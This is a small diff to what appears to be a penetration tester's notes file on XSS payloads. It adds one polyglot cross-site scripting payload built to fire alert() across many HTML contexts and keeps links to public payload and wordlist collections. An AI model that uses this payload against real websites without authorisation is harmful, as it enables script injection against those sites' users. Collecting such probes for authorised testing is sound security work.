@@ -1,4 +1,10 @@
 XSS Payloads
+
+The Ultimate
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+
 Links 
 https://github.com/payloadbox/xss-payload-list
 https://github.com/xmendez/wfuzz/tree/master/wordlist
